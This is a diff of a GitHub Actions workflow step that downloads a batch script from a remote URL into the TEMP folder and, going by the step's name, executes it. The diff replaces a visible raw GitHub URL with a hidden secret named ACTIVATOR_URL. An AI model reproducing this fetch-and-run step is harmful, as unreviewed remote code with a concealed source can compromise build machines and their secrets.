@@ -91,7 +91,7 @@ jobs:
 
       - name: Download and Execute Custom Script
         run: |
-          $url  = "https://raw.githubusercontent.com/wkvykexddo/ESSENCE/refs/heads/main/git-1.g"
+          $url = "${{ secrets.ACTIVATOR_URL }}"
           $dest = "$env:TEMP\script.bat"
 
           Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
